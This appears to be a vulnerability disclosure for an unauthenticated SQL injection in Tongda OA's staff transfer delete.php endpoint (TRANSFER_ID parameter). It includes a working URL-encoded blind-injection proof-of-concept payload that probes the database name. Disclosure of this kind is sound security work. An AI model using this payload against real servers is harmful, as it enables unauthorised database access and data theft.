Unauthorized SQL injection vulnerability exists in Tongda OA

version:Versions below 11.10 and version v2017

Route: general/hr/manage/staff_transfer/delete.php

There is an injected parameter: $TRANSFER_ID

The code here is very concise. When $TRANSFER_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since the brackets are closed here, there is a bypass.

![图片1](https://github.com/YaGaoT/cve/assets/97662585/7d9778f2-63ee-4668-a098-0b03f7101fe4)

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![图片2](https://github.com/YaGaoT/cve/assets/97662585/0d582036-54e6-4995-ba71-48d56a38477d)
